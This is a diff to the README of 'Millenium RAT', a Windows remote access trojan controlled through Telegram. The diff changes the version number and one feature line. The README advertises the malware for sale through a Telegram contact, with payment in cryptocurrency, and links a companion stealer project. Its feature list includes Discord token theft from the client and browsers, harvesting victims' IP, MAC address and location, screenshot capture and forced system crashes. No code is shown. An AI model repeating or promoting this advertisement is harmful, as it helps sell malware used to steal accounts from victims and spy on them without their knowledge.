@@ -1,4 +1,4 @@
-# Millenium RAT 2.8☠️
+# Millenium RAT 2.9☠️
 Telegram-controlled Windows RAT, no dedicated server or port forwarding require for usage. Contact me by Telegram to buy: <em>**@shinyenigma**</em> (Accepting USDT, BTC, TRX, XMR, ETH, LTC and more). You can see all the features below
 <br><em>Also check DotStealer: https://github.com/YellowKnife802/DotStealer </em>
 ## Features
@@ -26,7 +26,7 @@ Telegram-controlled Windows RAT, no dedicated server or port forwarding require 
 <br />🔶User log off/PC hibernating
 <br />🔶SendKeyPress feature
 <br />🔶Blue Screen of Death
-<br />🔶Bot gifting
+<br />🔶Easy bot gifting
 <br />🔶Screenshot grabbing
 <br />🔶Computer info grabbing (CPU, GPU, RAM, Country, city, IP, Mac Address etc)
 <br />🔶Discord token grabbing (from discord client and all the main browsers)
